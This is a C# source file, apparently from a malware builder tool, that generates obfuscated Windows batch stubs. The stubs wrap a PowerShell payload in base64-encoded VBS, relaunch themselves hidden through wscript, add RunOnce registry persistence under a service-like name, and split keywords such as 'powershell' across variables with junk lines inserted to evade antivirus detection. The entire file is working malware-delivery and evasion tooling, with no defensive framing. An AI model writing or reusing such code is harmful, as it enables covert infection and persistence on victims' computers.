using System.Text;

namespace WpfApp.StubBuilders
{
    internal static class BatStubBuilder
    {
        public static string Generate(string ps1Code)
        {
            // BAT wraps VBS — generate VBS first
            string vbsCode = VbsStubBuilder.Generate(ps1Code);

            // Base64-encode the VBS content
            byte[] vbsBytes = Encoding.UTF8.GetBytes(vbsCode);
            string b64Vbs = Convert.ToBase64String(vbsBytes);

            // PowerShell command: decode base64 → write .vbs → run silently via wscript.exe
            string psCmd = "$d=[Convert]::FromBase64String($env:B641+$env:B642);$p=[IO.Path]::GetTempPath()+'sv.vbs';[IO.File]::WriteAllBytes($p,$d);Start-Process wscript.exe -ArgumentList $p -WindowStyle Hidden";

            return GenerateObfuscatedBat(b64Vbs, psCmd);
        }

        internal static string GenerateObfuscatedBat(string b64Payload, string psCmd)
        {
            var rng = new Random();
            var sb = new StringBuilder();

            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(4, 8));

            // ---- @echo off + setlocal ----
            sb.AppendLine("@echo off");
            sb.AppendLine("setlocal");

            // ---- self-launch VBS to hide console window (relaunch silently via wscript.exe) ----
            sb.AppendLine("if exist \"%temp%\\r.flag\" goto :main");
            sb.AppendLine("cd. > \"%temp%\\r.flag\"");
            sb.AppendLine("echo CreateObject(\"WScript.Shell\").Run \"\"\"%~f0\"\"\", 0, False > \"%temp%\\r.vbs\"");
            sb.AppendLine("wscript.exe \"%temp%\\r.vbs\"");
            sb.AppendLine("exit /b");
            sb.AppendLine(":main");
            sb.AppendLine("del \"%temp%\\r.flag\" \"%temp%\\r.vbs\" 2>nul");

            // ---- RunOnce persistence (re-run stub on next login) ----
            sb.AppendLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"svcupdate\" /d \"\\\"%~f0\\\"\" /f");

            // ---- junk arithmetic at top ----
            int junkCount = rng.Next(3, 6);
            for (int i = 0; i < junkCount; i++)
            {
                string v = VarName();
                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}^{rng.Next(2, 99)}");
            }

            // ---- obfuscate "powershell" by splitting into 3-4 parts ----
            string psStr = "powershell";
            int psParts = rng.Next(3, 5);
            int psPartSize = (int)Math.Ceiling((double)psStr.Length / psParts);
            var psVars = new List<string>();
            for (int i = 0; i < psParts; i++)
            {
                int start = i * psPartSize;
                if (start >= psStr.Length) break;
                int len = Math.Min(psPartSize, psStr.Length - start);
                string chunk = psStr.Substring(start, len);
                string vn = VarName();
                psVars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- obfuscate "-NoP -C" by splitting into 4-6 parts ----
            string argStr = "-NoP -C";
            int argParts = rng.Next(4, 7);
            int argPartSize = (int)Math.Ceiling((double)argStr.Length / argParts);
            var argVars = new List<string>();
            for (int i = 0; i < argParts; i++)
            {
                int start = i * argPartSize;
                if (start >= argStr.Length) break;
                int len = Math.Min(argPartSize, argStr.Length - start);
                string chunk = argStr.Substring(start, len);
                string vn = VarName();
                argVars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set {v}={Guid.NewGuid().ToString("N").Substring(0, 8)}");
            }

            // ---- chunk the b64 payload into env vars (small chunks to avoid cmd.exe 8191 limit) ----
            int chunkCount = Math.Max(8, (int)Math.Ceiling(b64Payload.Length / 1200.0));
            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
            var b64Vars = new List<string>();
            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                if (start >= b64Payload.Length) break;
                int len = Math.Min(chunkSize, b64Payload.Length - start);
                string chunk = b64Payload.Substring(start, len);
                string vn = VarName();
                b64Vars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- more junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}+{rng.Next(10, 999)}");
            }

            // ---- build PowerShell command that concatenates ALL chunk env vars directly ----
            string envConcat = string.Join("+", b64Vars.Select(v => "$env:" + v));
            string fullPsCmd = psCmd.Replace("$env:B641+$env:B642", envConcat);

            // ---- more junk ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set {v}={rng.Next(1000, 9999)}");
            }

            // ---- build command name from parts ----
            string cmdVar1 = VarName();
            sb.Append($"set {cmdVar1}=");
            for (int i = 0; i < psVars.Count; i++)
            {
                sb.Append($"%{psVars[i]}%");
            }
            sb.AppendLine();

            string cmdVar2 = VarName();
            sb.Append($"set {cmdVar2}=");
            for (int i = 0; i < argVars.Count; i++)
            {
                sb.Append($"%{argVars[i]}%");
            }
            sb.AppendLine();

            // ---- junk ----
            string jvLast = VarName();
            sb.AppendLine($"set {jvLast}=%random%");

            // ---- execute ----
            sb.AppendLine($"%{cmdVar1}% %{cmdVar2}% \"{fullPsCmd}\"");

            // ---- cleanup ----
            sb.AppendLine("endlocal");

            return sb.ToString();
        }
    }
}
